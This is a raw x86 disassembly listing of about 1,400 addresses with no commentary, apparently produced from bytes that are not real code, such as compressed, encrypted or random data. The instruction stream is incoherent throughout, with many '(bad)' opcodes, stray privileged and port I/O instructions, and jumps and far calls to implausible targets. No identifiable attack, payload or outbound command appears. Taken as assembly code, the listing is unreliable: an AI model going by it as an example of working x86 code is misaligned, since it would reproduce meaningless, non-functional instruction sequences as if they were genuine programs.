  41d1c0:	mov    bh,0xc2
  41d1c2:	in     eax,0xbf
  41d1c4:	or     al,0x51
  41d1c6:	sub    BYTE PTR [ecx+0x64],cl
  41d1c9:	cmc    
  41d1ca:	push   0xffffff84
  41d1cc:	aas    
  41d1cd:	leave  
  41d1ce:	sub    ebx,DWORD PTR [eax+0x25]
  41d1d1:	adc    al,0x1c
  41d1d3:	addr16 leave 
  41d1d5:	enter  0xcc1a,0xa
  41d1d9:	add    BYTE PTR [esi-0x53],ah
  41d1dc:	bnd jle 0x41d237
  41d1df:	add    al,0xb
  41d1e1:	imul   edi
  41d1e3:	xchg   edi,eax
  41d1e4:	xor    ebx,ebp
  41d1e6:	stos   DWORD PTR es:[edi],eax
  41d1e7:	jb     0x41d246
  41d1e9:	fcmovb st,st(1)
  41d1eb:	inc    eax
  41d1ec:	es mov WORD PTR ds:[eax+eax*2],ds
  41d1f1:	idiv   ecx
  41d1f3:	push   ebx
  41d1f4:	aaa    
  41d1f5:	(bad)  
  41d1f6:	cmp    DWORD PTR [edx],esp
  41d1f8:	xchg   edi,eax
  41d1f9:	pop    ebx
  41d1fa:	ds repz daa 
  41d1fd:	imul   eax,DWORD PTR [edx+0x148fe752],0x46364eb6
  41d207:	(bad)  
  41d208:	aas    
  41d209:	pop    edi
  41d20a:	xor    dh,BYTE PTR [eax]
  41d20c:	inc    ebx
  41d20d:	inc    esp
  41d20e:	xchg   ebx,eax
  41d20f:	push   0xffffffbc
  41d211:	mov    edi,0x16a6b723
  41d216:	mov    ds:0x2fd50ea2,al
  41d21b:	in     eax,0xf5
  41d21d:	add    DWORD PTR [edi-0x73],edx
  41d220:	call   0xff9d2e1d
  41d225:	xchg   ebp,eax
  41d226:	xchg   edi,eax
  41d227:	push   es
  41d228:	icebp  
  41d229:	imul   esi,DWORD PTR [ebp+0x11c10b7b],0x20b9642d
  41d233:	push   0x4c
  41d235:	jne    0x41d260
  41d237:	cld    
  41d238:	mov    ch,0xe6
  41d23a:	nop
  41d23b:	and    al,0x6a
  41d23d:	nop
  41d23e:	cwde   
  41d23f:	mov    ebp,0x878e4d21
  41d244:	and    ch,BYTE PTR [edi+0x4f914c82]
  41d24a:	add    edi,eax
  41d24c:	cli    
  41d24d:	ins    BYTE PTR es:[edi],dx
  41d24e:	sbb    DWORD PTR [edi+0x669d452e],ebp
  41d254:	mov    esp,0xc1ce37e8
  41d259:	sbb    al,0x92
  41d25b:	xor    ebx,DWORD PTR [ebx]
  41d25d:	or     BYTE PTR [eax+0xd961f51],cl
  41d263:	jno    0x41d2b0
  41d265:	mov    bl,0x1
  41d267:	sbb    dl,BYTE PTR [ecx+0x46]
  41d26a:	repnz pop ebp
  41d26c:	test   BYTE PTR [esi],cl
  41d26e:	lods   al,BYTE PTR ds:[esi]
  41d26f:	js     0x41d2a2
  41d271:	xor    bl,bl
  41d273:	pop    edx
  41d274:	test   BYTE PTR [ecx-0x6c35530],bl
  41d27a:	jmp    0x41d255
  41d27c:	stos   BYTE PTR es:[edi],al
  41d27d:	sbb    esi,0x4c32cfa5
  41d283:	nop    edx
  41d286:	scas   eax,DWORD PTR es:[edi]
  41d287:	in     eax,0x14
  41d289:	pop    ss
  41d28a:	mov    fs,edx
  41d28c:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  41d28e:	pop    edi
  41d28f:	or     DWORD PTR [ecx+0x3a],eax
  41d292:	jmp    0x1b8c625b
  41d297:	cs out dx,eax
  41d299:	cld    
  41d29a:	(bad)  
  41d29b:	out    dx,eax
  41d29c:	fcomip st,st(2)
  41d29e:	ffreep st(1)
  41d2a0:	std    
  41d2a1:	sub    al,0x77
  41d2a3:	mov    bh,BYTE PTR [edx]
  41d2a5:	adc    BYTE PTR [eax+edi*1],cl
  41d2a8:	hlt    
  41d2a9:	je     0x41d27d
  41d2ab:	pop    esi
  41d2ac:	int3   
  41d2ad:	sub    DWORD PTR [ebx+0x349ea12b],esp
  41d2b3:	push   cs
  41d2b4:	nop
  41d2b5:	pop    esi
  41d2b6:	xor    DWORD PTR [edx-0x4e36a097],esp
  41d2bc:	paddusw mm7,QWORD PTR [ecx-0xa]
  41d2c0:	mov    WORD PTR [eax],ss
  41d2c2:	ret    0x276b
  41d2c5:	int    0x85
  41d2c7:	dec    ebp
  41d2c8:	aam    0xa4
  41d2ca:	(bad)  
  41d2cb:	dec    ebp
  41d2cc:	aaa    
  41d2cd:	arpl   WORD PTR [ebx-0x7ffee371],si
  41d2d3:	div    BYTE PTR [ecx-0x2610e2cc]
  41d2d9:	ficom  WORD PTR [edx+ecx*8-0x48af438e]
  41d2e0:	sbb    al,0x21
  41d2e2:	stos   BYTE PTR es:[edi],al
  41d2e3:	je     0x41d31f
  41d2e5:	scas   eax,DWORD PTR es:[edi]
  41d2e6:	mov    ecx,0x1ab29596
  41d2eb:	popa   
  41d2ec:	mov    ch,0x45
  41d2ee:	mov    edi,0xb7af1618
  41d2f3:	push   edx
  41d2f4:	pop    ds
  41d2f5:	rcl    BYTE PTR [edx],0x55
  41d2f8:	nop
  41d2f9:	lods   al,BYTE PTR ds:[esi]
  41d2fa:	inc    esp
  41d2fb:	jae    0x41d377
  41d2fd:	sti    
  41d2fe:	lods   eax,DWORD PTR ds:[esi]
  41d2ff:	jae    0x41d2e2
  41d301:	fs addr16 sti 
  41d304:	gs leave 
  41d306:	xor    BYTE PTR [ebx-0x68],ah
  41d309:	jns    0x41d302
  41d30b:	mov    edi,0x14db30e5
  41d310:	xchg   DWORD PTR [eax-0xa42afdf],ecx
  41d316:	lods   eax,DWORD PTR ds:[esi]
  41d317:	das    
  41d318:	mov    bl,0xb3
  41d31a:	add    dh,0xec
  41d31d:	push   ecx
  41d31e:	sbb    al,ch
  41d320:	aaa    
  41d321:	(bad)  
  41d322:	(bad)  
  41d323:	mov    eax,0xe08f63d7
  41d328:	inc    esp
  41d329:	test   al,0xc2
  41d32b:	cmp    eax,0xf7322433
  41d330:	jo     0x41d2b7
  41d332:	or     bh,BYTE PTR [edi+0x26]
  41d335:	cmp    eax,0xe77a2338
  41d33a:	cmp    ebp,DWORD PTR [eax]
  41d33c:	data16 ja 0x41d34d
  41d33f:	xor    DWORD PTR [edx-0x4a],eax
  41d342:	leave  
  41d343:	stos   BYTE PTR es:[edi],al
  41d344:	ret    
  41d345:	daa    
  41d346:	mov    bh,0xb2
  41d348:	jnp    0x41d34c
  41d34a:	mov    dl,0x8b
  41d34c:	or     BYTE PTR [ebp-0x15],ch
  41d34f:	inc    ebx
  41d350:	jmp    DWORD PTR [edi+ebp*2]
  41d353:	into   
  41d354:	lea    ebp,[ecx+0x38735a27]
  41d35a:	rcr    BYTE PTR [ebx+0x2f],0x47
  41d35e:	and    BYTE PTR [ecx],bh
  41d360:	xor    DWORD PTR [esi],edi
  41d362:	das    
  41d363:	js     0x41d3e4
  41d365:	xchg   edi,eax
  41d366:	pop    ebp
  41d367:	sbb    BYTE PTR [ecx],ch
  41d369:	mov    bh,0x4a
  41d36b:	mov    al,BYTE PTR [ebp-0x75]
  41d36e:	adc    edi,DWORD PTR [esi+0x1a]
  41d371:	sub    ch,bl
  41d373:	sbb    BYTE PTR [ebp-0x65],dl
  41d376:	jnp    0x41d3d4
  41d378:	sub    cl,0x8e
  41d37b:	jmp    0x41d3a6
  41d37d:	dec    edi
  41d37e:	fsubr  DWORD PTR [edi]
  41d380:	add    esp,ebx
  41d382:	ins    DWORD PTR es:[edi],dx
  41d383:	cmp    ch,BYTE PTR [ebx]
  41d385:	pop    es
  41d386:	mov    al,ds:0x97f2449f
  41d38b:	mov    WORD PTR [ecx],?
  41d38d:	sbb    dl,ah
  41d38f:	sbb    eax,0xf13fc299
  41d394:	repnz enter 0x4d29,0x8
  41d399:	ins    BYTE PTR es:[edi],dx
  41d39a:	or     eax,0x817a0935
  41d39f:	adc    eax,DWORD PTR [eax-0x67]
  41d3a2:	js     0x41d402
  41d3a4:	rcr    DWORD PTR [eax*8-0x55ac22a0],1
  41d3ab:	xlat   BYTE PTR ds:[ebx]
  41d3ac:	pop    edx
  41d3ad:	push   esp
  41d3ae:	xchg   edi,eax
  41d3af:	add    al,al
  41d3b1:	mov    bl,BYTE PTR [edx+0x41b706]
  41d3b7:	fwait
  41d3b8:	rol    DWORD PTR [edx],0xf
  41d3bb:	dec    ecx
  41d3bc:	and    esi,ebp
  41d3be:	jle    0x41d383
  41d3c0:	sub    eax,0xd0bba8
	...
  41d3d1:	call   0xbef9:0xcff14f56
  41d3d8:	jg     0x41d423
  41d3da:	push   ss
  41d3db:	jecxz  0x41d387
  41d3dd:	jmp    0x41d361
  41d3df:	jnp    0x41d3b6
  41d3e1:	mov    edi,0xab00014f
  41d3e6:	add    eax,DWORD PTR [eax]
  41d3e8:	add    ah,cl
  41d3ea:	jle    0x41d3c8
  41d3ec:	call   0x8746c500
  41d3f1:	(bad)  ds:0x6acd986
  41d3f7:	pop    es
  41d3f8:	mov    ds:0x247cecd6,eax
  41d3fd:	rol    BYTE PTR [edi-0x7f],1
  41d400:	inc    eax
  41d401:	sub    ah,BYTE PTR [ebx]
  41d403:	adc    dh,BYTE PTR [ebx]
  41d405:	xchg   esi,eax
  41d406:	sar    DWORD PTR [edi-0x144ea840],cl
  41d40c:	cs clc 
  41d40e:	int3   
  41d40f:	mov    ecx,eax
  41d411:	fwait
  41d412:	xchg   edx,eax
  41d413:	pushf  
  41d414:	add    esi,DWORD PTR [ebx+ebp*8-0x51]
  41d418:	(bad)  
  41d419:	ret    0x69b0
  41d41c:	ja     0x41d472
  41d41e:	add    DWORD PTR [edi-0x69],ebx
  41d421:	pop    es
  41d422:	gs mov bl,0x21
  41d425:	(bad)  
  41d426:	xchg   ebp,eax
  41d427:	cmp    BYTE PTR [esi+esi*2-0xfa354ee],al
  41d42e:	xchg   esp,eax
  41d42f:	adc    esi,ebp
  41d431:	add    BYTE PTR [edi],ah
  41d433:	mov    ah,0x95
  41d435:	or     al,0x18
  41d437:	mov    edx,0x5f773f17
  41d43c:	leave  
  41d43d:	repnz mov ah,BYTE PTR [esp+esi*8-0x1d]
  41d442:	test   BYTE PTR [ecx+0x63],0xb5
  41d446:	inc    ebp
  41d447:	loopne 0x41d49f
  41d449:	fucomp st(0)
  41d44b:	mov    esi,0x733c3f9f
  41d450:	adc    al,0xa1
  41d452:	jne    0x41d456
  41d454:	je     0x41d492
  41d456:	addr16 jmp 0x41d44e
  41d459:	fdivr  st(3),st
  41d45b:	or     al,0x5b
  41d45d:	mov    dh,0x7c
  41d45f:	rcr    DWORD PTR [ebp-0x6c],1
  41d462:	dec    esi
  41d463:	ja     0x41d4b9
  41d465:	int    0x45
  41d467:	jns    0x41d45b
  41d469:	fst    QWORD PTR [ebx-0x3b]
  41d46c:	ror    DWORD PTR [edi+0x24],1
  41d46f:	cld    
  41d470:	dec    esp
  41d471:	fst    QWORD PTR [ebx]
  41d473:	xchg   esp,eax
  41d474:	pop    ecx
  41d475:	mov    esp,DWORD PTR [eax-0x7b9b7ebc]
  41d47b:	pop    ss
  41d47c:	push   edx
  41d47d:	neg    BYTE PTR [ecx+eiz*1+0x5ef3921e]
  41d484:	mov    cl,dh
  41d486:	xchg   BYTE PTR [ecx],al
  41d488:	cmp    dh,al
  41d48a:	fist   DWORD PTR [eax-0x2daa5b40]
  41d490:	jo     0x41d474
  41d492:	mov    al,ds:0xc9ab9fbd
  41d497:	jno    0x41d432
  41d499:	(bad)  
  41d49a:	cld    
  41d49b:	scas   eax,DWORD PTR es:[edi]
  41d49c:	cwde   
  41d49d:	or     eax,ebx
  41d49f:	add    al,0x86
  41d4a1:	push   ebx
  41d4a2:	mov    dl,0x11
  41d4a4:	iret   
  41d4a5:	pop    eax
  41d4a6:	inc    ebp
  41d4a7:	ret    
  41d4a8:	(bad)  
  41d4a9:	dec    ebx
  41d4aa:	inc    esi
  41d4ab:	repz cmp ebp,0x505afd46
  41d4b2:	mov    bl,0xde
  41d4b4:	cmp    al,0x8f
  41d4b6:	nop
  41d4b7:	push   esi
  41d4b8:	and    eax,0xd978761f
  41d4bd:	stos   BYTE PTR es:[edi],al
  41d4be:	(bad)  
  41d4bf:	out    dx,al
  41d4c0:	jmp    0x41d493
  41d4c2:	mov    ds:0xcb529d0c,al
  41d4c7:	rol    BYTE PTR [eax],0x8c
  41d4ca:	lods   al,BYTE PTR ds:[esi]
  41d4cb:	xchg   ecx,eax
  41d4cc:	add    eax,0xefb7c720
  41d4d1:	jo     0x41d511
  41d4d3:	fst    DWORD PTR [ebx+0x5f]
  41d4d6:	test   BYTE PTR [eax-0x60bd072d],al
  41d4dc:	xlat   BYTE PTR ds:[ebx]
  41d4dd:	and    bh,BYTE PTR [eax-0x79]
  41d4e0:	mov    ds:0xb3f96de8,ax
  41d4e6:	int3   
  41d4e7:	push   edx
  41d4e8:	jnp    0x41d53d
  41d4ea:	mov    ah,0x53
  41d4ec:	mov    ebp,0xc47cfa6c
  41d4f1:	or     ebp,DWORD PTR [eax]
  41d4f3:	test   DWORD PTR [ebp+esi*4+0x18bdd81d],ebp
  41d4fa:	jmp    0x41d4d6
  41d4fc:	(bad)  
  41d4fd:	jge    0x41d4ff
  41d4ff:	aad    0x93
  41d501:	loop   0x41d513
  41d503:	fldcw  WORD PTR [ebx+0x6cdef9af]
  41d509:	or     eax,0x59669a1
  41d50e:	(bad)  
  41d50f:	fsubr  QWORD PTR [ecx+0x6a]
  41d512:	cwde   
  41d513:	lods   eax,DWORD PTR ds:[esi]
  41d514:	dec    eax
  41d515:	rol    ebx,1
  41d517:	bound  eax,QWORD PTR [edi+ecx*2-0x65]
  41d51b:	cmp    ecx,DWORD PTR [ebp*4+0x40773d3e]
  41d522:	pusha  
  41d523:	sbb    BYTE PTR [si],cl
  41d526:	pop    ds
  41d527:	lea    edx,[eax-0x7d2360f2]
  41d52d:	dec    esp
  41d52e:	nop
  41d52f:	mov    ch,0x13
  41d531:	(bad)  
  41d533:	xor    DWORD PTR [eax+0xc],ebp
  41d536:	outs   dx,DWORD PTR ds:[esi]
  41d537:	js     0x41d50c
  41d539:	mov    ebx,0xea8a0b5
  41d53e:	pusha  
  41d53f:	ja     0x41d53b
  41d541:	mov    eax,0x57b7bdc3
  41d546:	mov    eax,ds:0x318bda4d
  41d54b:	cli    
  41d54c:	aam    0xfb
  41d54e:	add    eax,0xfa7faedf
  41d553:	imul   ebp,DWORD PTR [ebp+0x71f13da4],0x1dd0c2c4
  41d55d:	jae    0x41d554
  41d55f:	in     al,dx
  41d560:	xor    al,0x74
  41d562:	sar    DWORD PTR [ebp+0x6f8c3020],1
  41d568:	mov    DWORD PTR [edx+0x6b],eax
  41d56b:	pop    eax
  41d56c:	inc    ebp
  41d56d:	xlat   BYTE PTR ds:[ebx]
  41d56e:	adc    esp,DWORD PTR [ebx-0x1]
  41d571:	and    ah,ch
  41d573:	rcr    BYTE PTR [eax+0x1a],1
  41d576:	mov    eax,eax
  41d578:	pop    ds
  41d579:	(bad)  
  41d57a:	scas   eax,DWORD PTR es:[edi]
  41d57b:	fistp  WORD PTR [ebx]
  41d57d:	xor    al,0xe4
  41d580:	mov    ecx,DWORD PTR [edi+0x63]
  41d583:	ror    DWORD PTR [edi-0x13],cl
  41d586:	(bad)  
  41d587:	lods   al,BYTE PTR ds:[esi]
  41d588:	pop    ebp
  41d589:	pop    esi
  41d58a:	stos   BYTE PTR es:[edi],al
  41d58b:	ja     0x41d5e0
  41d58d:	pushf  
  41d58e:	or     ch,bl
  41d590:	lods   eax,DWORD PTR ds:[esi]
  41d591:	and    al,0x64
  41d593:	jb     0x41d51d
  41d595:	(bad)
  41d598:	xchg   esi,eax
  41d599:	jg     0x41d55f
  41d59b:	lock or eax,ebx
  41d59e:	xor    BYTE PTR [esi],0x53
  41d5a1:	mov    dh,0x7b
  41d5a3:	mov    al,ds:0xb43319fd
  41d5a8:	shl    ebx,cl
  41d5aa:	pop    edi
  41d5ab:	mov    ds:0x797fed53,al
  41d5b0:	add    dh,BYTE PTR [ebx+ebp*8]
  41d5b3:	sbb    dl,BYTE PTR [esi+0x4c823098]
  41d5b9:	mov    al,ds:0x8b329f2f
  41d5be:	fxam   
  41d5c0:	push   eax
  41d5c1:	xchg   esi,eax
  41d5c2:	jl     0x41d5da
  41d5c4:	mov    ?,WORD PTR [ebx-0xd1ffb5a]
  41d5ca:	leave  
  41d5cb:	in     al,dx
  41d5cc:	xchg   esp,eax
  41d5cd:	imul   esp,DWORD PTR [ebx-0x449f44f1],0xe71f3ea5
  41d5d7:	dec    esi
  41d5d8:	mov    edx,0x50830dae
  41d5dd:	mov    ss,WORD PTR [edx+ecx*2]
  41d5e0:	cmp    eax,0x106ca125
  41d5e5:	jbe    0x41d657
  41d5e7:	sti    
  41d5e8:	fs hlt 
  41d5ea:	mov    bh,0xd1
  41d5ec:	xchg   edi,eax
  41d5ed:	aaa    
  41d5ee:	std    
  41d5ef:	test   edi,eax
  41d5f1:	aad    0x7e
  41d5f3:	mov    BYTE PTR [esi+0x29],dh
  41d5f6:	fcomp  QWORD PTR [ebp+0x33]
  41d5f9:	mov    eax,0x751583bf
  41d5fe:	fsub   QWORD PTR [ecx-0x49]
  41d601:	push   ecx
  41d602:	adc    al,0xf2
  41d604:	pop    ebx
  41d605:	fwait
  41d606:	dec    ebx
  41d607:	xchg   esi,eax
  41d608:	adc    BYTE PTR [edx-0x4fc1624d],dh
  41d60e:	pop    es
  41d60f:	sub    DWORD PTR [ecx-0xb],ebp
  41d612:	lea    esp,[edx]
  41d614:	push   ecx
  41d615:	dec    eax
  41d616:	mov    ah,cl
  41d618:	jecxz  0x41d61e
  41d61a:	mov    ah,0x36
  41d61c:	push   ds
  41d61d:	dec    esi
  41d61e:	es push esp
  41d620:	sti    
  41d621:	push   eax
  41d622:	cmp    eax,0xea7fc152
  41d627:	or     eax,0x6af87ca9
  41d62c:	stos   BYTE PTR es:[edi],al
  41d62d:	push   ebp
  41d62e:	pop    eax
  41d62f:	out    0xb9,al
  41d631:	aad    0xf5
  41d633:	cwde   
  41d634:	xchg   ebx,eax
  41d635:	popf   
  41d636:	sbb    bh,BYTE PTR [eax]
  41d638:	pusha  
  41d639:	add    BYTE PTR [ebp-0x12],ah
  41d63c:	pop    es
  41d63d:	out    0x36,al
  41d63f:	pop    es
  41d640:	and    eax,0xff15dfe8
  41d645:	retf   0xc20a
  41d648:	imul   edx,DWORD PTR [edx+eiz*8+0x43],0x744e6d2b
  41d650:	ret    0x9452
  41d653:	mov    bl,0x2f
  41d655:	sti    
  41d656:	jecxz  0x41d646
  41d658:	xchg   edx,eax
  41d659:	inc    edi
  41d65a:	mov    ds:0xa62b2c78,eax
  41d65f:	pop    ss
  41d660:	aam    0x82
  41d662:	pushf  
  41d663:	stc    
  41d664:	int3   
  41d665:	jmp    0xa466:0xae40a989
  41d66c:	imul   edi,DWORD PTR [ebx+edi*8-0x3b],0x5ab11729
  41d674:	or     dl,dl
  41d676:	ficom  DWORD PTR ds:0x95a4ce37
  41d67c:	test   DWORD PTR [ebp+0x5],esi
  41d67f:	shr    DWORD PTR [ecx+0x78c3d679],1
  41d685:	outs   dx,BYTE PTR ds:[esi]
  41d686:	mov    ds,WORD PTR [edi+0x69]
  41d689:	mul    ebx
  41d68b:	dec    ebx
  41d68c:	mov    esi,0x147cb1a9
  41d691:	mov    dh,0xb2
  41d693:	xor    BYTE PTR [esi+0x4],dl
  41d696:	cmp    al,0xd7
  41d698:	bound  esp,QWORD PTR [eax]
  41d69a:	jle    0x41d62f
  41d69c:	push   ebx
  41d69d:	pop    esp
  41d69e:	ss jb  0x41d62d
  41d6a1:	mov    bl,0x11
  41d6a3:	xor    eax,0x49c1517c
  41d6a8:	and    al,0xa
  41d6aa:	adc    al,0xfc
  41d6ac:	xchg   ebx,eax
  41d6ad:	sbb    edx,esi
  41d6af:	out    dx,al
  41d6b0:	(bad)  
  41d6b1:	(bad)  
  41d6b2:	rcl    BYTE PTR [edx+0x49981128],cl
  41d6b8:	fcomp  DWORD PTR [ebx+0x46bf5a4c]
  41d6be:	push   0x19
  41d6c0:	data16 std 
  41d6c2:	sub    ebp,DWORD PTR ds:0xa4e50add
  41d6c8:	iret   
  41d6c9:	scas   eax,DWORD PTR es:[edi]
  41d6ca:	in     eax,dx
  41d6cb:	sahf   
  41d6cc:	in     al,0x6f
  41d6ce:	fwait
  41d6cf:	add    edx,ebp
  41d6d1:	add    al,0xd2
  41d6d3:	mov    ds:0x5c137ef3,al
  41d6d8:	sub    bh,bh
  41d6da:	pop    edi
  41d6db:	dec    esi
  41d6dc:	fcomp  DWORD PTR [esi]
  41d6de:	jns    0x41d6f3
  41d6e0:	clc    
  41d6e1:	inc    ecx
  41d6e2:	aad    0xba
  41d6e4:	inc    BYTE PTR [eax]
  41d6e6:	add    al,0xe
  41d6e8:	xchg   ecx,eax
  41d6e9:	push   cs
  41d6ea:	or     ebx,DWORD PTR [ebp+0x407ee5d0]
  41d6f0:	loop   0x41d6e5
  41d6f2:	push   0xbbc3f14b
  41d6f7:	push   edi
  41d6f8:	arpl   WORD PTR [esi-0x1bc8e1d2],si
  41d6fe:	data16 mov cl,0x6a
  41d701:	outs   dx,DWORD PTR ds:[esi]
  41d702:	sub    BYTE PTR [ebp+0x6ad6c385],ch
  41d708:	cmp    ch,BYTE PTR [edx]
  41d70a:	cmp    al,0x74
  41d70c:	loope  0x41d731
  41d70e:	sbb    al,0xdc
  41d710:	jbe    0x41d6c9
  41d712:	repz fcomp QWORD PTR [eax+0x4ae36e1c]
  41d719:	sub    DWORD PTR [ebp+edx*8+0x1e],0x24c9f3bb
  41d721:	mov    ecx,0x971b353f
  41d727:	pop    ecx
  41d728:	mov    bh,0xae
  41d72a:	je     0x41d6ba
  41d72c:	aam    0x83
  41d72e:	pop    es
  41d72f:	popf   
  41d730:	xchg   BYTE PTR [ebx+0x75],dl
  41d733:	out    dx,al
  41d734:	mov    DWORD PTR [edi+0x35eb6364],ebx
  41d73a:	sub    eax,0x3a72453e
  41d73f:	test   al,0xe6
  41d741:	add    esi,edi
  41d743:	popf   
  41d744:	inc    ebx
  41d745:	into   
  41d746:	sbb    ebp,DWORD PTR [edx+0x6b637028]
  41d74c:	and    esp,edi
  41d74e:	add    al,0x1a
  41d750:	mov    ds:0x67392b2f,al
  41d755:	sub    ebp,esp
  41d757:	mov    es,WORD PTR ds:0xecd4dc73
  41d75d:	test   al,0xf
  41d75f:	rol    BYTE PTR [ebx],0x50
  41d762:	icebp  
  41d763:	xor    BYTE PTR [edi+0x72e0c46b],dl
  41d769:	pop    esi
  41d76a:	add    al,0xb5
  41d76c:	ret    0xead3
  41d76f:	aad    0x3f
  41d771:	rcr    ch,1
  41d773:	(bad)  
  41d774:	jle    0x41d7cd
  41d776:	mov    ah,0x10
  41d778:	push   ecx
  41d779:	sbb    al,0xe8
  41d77b:	fs mov es,eax
  41d77e:	into   
  41d77f:	and    bh,BYTE PTR [eax-0x2]
  41d782:	push   0xfffffffb
  41d784:	sub    eax,0xb856e047
  41d789:	ss aas 
  41d78b:	jne    0x41d791
  41d78d:	sar    BYTE PTR [edi],cl
  41d78f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d790:	lds    edx,FWORD PTR [ecx+0xe7ce]
	...
  41d79e:	add    BYTE PTR [eax],al
  41d7a0:	add    ah,bh
  41d7a2:	xlat   BYTE PTR ds:[ebx]
  41d7a3:	dec    esp
  41d7a4:	call   0xd83ed318
  41d7a9:	adc    BYTE PTR [ecx-0x30d9ec5e],ah
  41d7af:	push   edx
  41d7b0:	in     eax,dx
  41d7b1:	push   0x53
  41d7b3:	add    DWORD PTR [eax],eax
  41d7b5:	stos   DWORD PTR es:[edi],eax
  41d7b6:	add    eax,DWORD PTR [eax]
  41d7b8:	add    BYTE PTR [edx+0x78cb3ed2],bl
  41d7be:	stc    
  41d7bf:	mov    al,ds:0x3eaa569b
  41d7c4:	fwait
  41d7c5:	pop    ebx
  41d7c6:	mov    esi,DWORD PTR [ebp-0x457f7f1]
  41d7cc:	push   edx
  41d7cd:	xchg   ecx,eax
  41d7ce:	pop    ebx
  41d7cf:	mov    al,ds:0x426c6984
  41d7d4:	xor    eax,0xa5c03427
  41d7d9:	lahf   
  41d7da:	push   ss
  41d7db:	fstp   st(2)
  41d7dd:	xchg   DWORD PTR [edx],esi
  41d7df:	push   cs
  41d7e0:	and    eax,0xd606ffe0
  41d7e5:	push   ebx
  41d7e6:	daa    
  41d7e7:	cmovs  eax,DWORD PTR [edi]
  41d7ea:	push   esp
  41d7eb:	sub    WORD PTR [ebx-0x50],di
  41d7ef:	fisub  WORD PTR [edi+edx*8-0x5f206058]
  41d7f6:	pop    edi
  41d7f7:	inc    ecx
  41d7f8:	mov    al,0x93
  41d7fa:	mov    edi,0xe1e2b4b3
  41d7ff:	mov    esp,0x191347bc
  41d804:	and    esp,DWORD PTR [edi+0x45]
  41d807:	mov    ebp,0x9c677c9
  41d80c:	adc    DWORD PTR [edx+ebx*4],eax
  41d80f:	push   ds
  41d810:	retf   
  41d811:	fild   DWORD PTR [ecx+0x4f]
  41d814:	mov    ecx,0xc9025a09
  41d819:	gs das 
  41d81b:	adc    esp,DWORD PTR [esi+0x18f8dc94]
  41d821:	xchg   ecx,eax
  41d822:	jb     0x41d884
  41d824:	sahf   
  41d825:	sti    
  41d826:	add    al,0xad
  41d828:	mov    eax,0x48eb49b7
  41d82d:	and    edx,DWORD PTR [edx]
  41d82f:	call   0x18de:0x17a8b2e
  41d836:	inc    ah
  41d838:	out    0xdf,eax
  41d83a:	test   DWORD PTR ds:0x54abc3fe,esi
  41d840:	pop    ecx
  41d841:	and    BYTE PTR [eax+0x71],bh
  41d844:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d845:	out    dx,eax
  41d846:	in     eax,0x40
  41d848:	aaa    
  41d849:	dec    esp
  41d84a:	std    
  41d84b:	fdiv   DWORD PTR [eax+0x718832ed]
  41d851:	or     BYTE PTR [esi+ebp*8-0x1f],ch
  41d855:	mov    ds:0xc1301e3f,al
  41d85a:	ins    BYTE PTR es:[edi],dx
  41d85b:	shl    BYTE PTR [esi+ebx*8+0x37bb5d92],0xe3
  41d863:	loop   0x41d8c0
  41d865:	pop    ecx
  41d866:	ds pop esp
  41d868:	or     al,0xaa
  41d86a:	retf   0x7963
  41d86d:	ja     0x41d84b
  41d86f:	icebp  
  41d870:	dec    eax
  41d871:	or     eax,0xf45dc673
  41d876:	jg     0x41d8ae
  41d878:	fidivr DWORD PTR [ebp-0x14]
  41d87b:	cld    
  41d87c:	jmp    0xe77f:0xc5d74107
  41d883:	ja     0x41d8c2
  41d885:	fdiv   DWORD PTR [edi]
  41d887:	lds    edi,FWORD PTR [edi+0x2e]
  41d88a:	mov    esi,0xab885bcb
  41d88f:	call   0xb86e:0x5ae3b8ec
  41d896:	cdq    
  41d897:	jle    0x41d8b2
  41d899:	or     ah,BYTE PTR [esi]
  41d89b:	pop    ebx
  41d89c:	cmc    
  41d89d:	push   edi
  41d89e:	jge    0x41d85c
  41d8a0:	xchg   esp,eax
  41d8a1:	and    DWORD PTR [ecx+0x20],edi
  41d8a4:	lock xchg BYTE PTR [eax-0x2d1eb154],bl
  41d8ab:	imul   esi,DWORD PTR [esi+0x20],0x71
  41d8af:	bound  ebp,QWORD PTR [ebx]
  41d8b1:	js     0x41d8d4
  41d8b3:	fsubr  st,st(6)
  41d8b5:	mov    ch,0x65
  41d8b7:	shr    DWORD PTR [ecx],cl
  41d8b9:	or     al,0x5f
  41d8bb:	mov    ecx,0x3139a0f5
  41d8c0:	pop    esp
  41d8c1:	in     eax,0x15
  41d8c3:	pop    edx
  41d8c4:	jno    0x41d8c1
  41d8c6:	in     al,dx
  41d8c7:	mov    DWORD PTR [eax+0x56],esp
  41d8ca:	icebp  
  41d8cb:	in     al,dx
  41d8cc:	cdq    
  41d8cd:	popf   
  41d8ce:	push   cs
  41d8cf:	pop    esi
  41d8d0:	and    dh,BYTE PTR [edi-0xa9fb405]
  41d8d6:	cld    
  41d8d7:	or     dh,0xb0
  41d8da:	ins    BYTE PTR es:[edi],dx
  41d8db:	inc    esi
  41d8dc:	mov    ah,0xb8
  41d8de:	inc    ecx
  41d8df:	repz pop ebx
  41d8e1:	xchg   esp,eax
  41d8e2:	jbe    0x41d890
  41d8e4:	loopne 0x41d934
  41d8e6:	mov    bl,0x54
  41d8e8:	arpl   WORD PTR [ebx+0x29],ax
  41d8eb:	jecxz  0x41d87d
  41d8ed:	mov    bh,BYTE PTR [esi]
  41d8ef:	int    0x65
  41d8f1:	cmp    ebx,esp
  41d8f3:	mov    esp,0xc1e3cdbd
  41d8f8:	xchg   BYTE PTR [eax],ah
  41d8fa:	mov    esi,0xdc434183
  41d8ff:	mov    dh,0xc5
  41d901:	pop    ecx
  41d902:	imul   BYTE PTR [eax]
  41d904:	call   0xc5745c90
  41d909:	dec    esp
  41d90a:	pop    esp
  41d90b:	sub    al,0x42
  41d90d:	jno    0x41d922
  41d90f:	stc    
  41d910:	and    ebp,esi
  41d912:	add    BYTE PTR [edx],ah
  41d914:	test   DWORD PTR [edx-0x2],eax
  41d917:	cmp    al,0x6
  41d919:	cli    
  41d91a:	mov    eax,ds:0xc7992597
  41d91f:	ss mov ebx,0x1dac5112
  41d925:	pop    eax
  41d926:	rcr    DWORD PTR [esi],cl
  41d928:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d929:	mov    esp,0x3fd01ace
  41d92e:	jmp    0xa925699c
  41d933:	jmp    0x687f:0xfc1e6df6
  41d93a:	sub    eax,0x10745142
  41d93f:	cmp    al,0xe6
  41d941:	lock or dl,bh
  41d944:	shl    BYTE PTR [esi],0x51
  41d947:	pop    eax
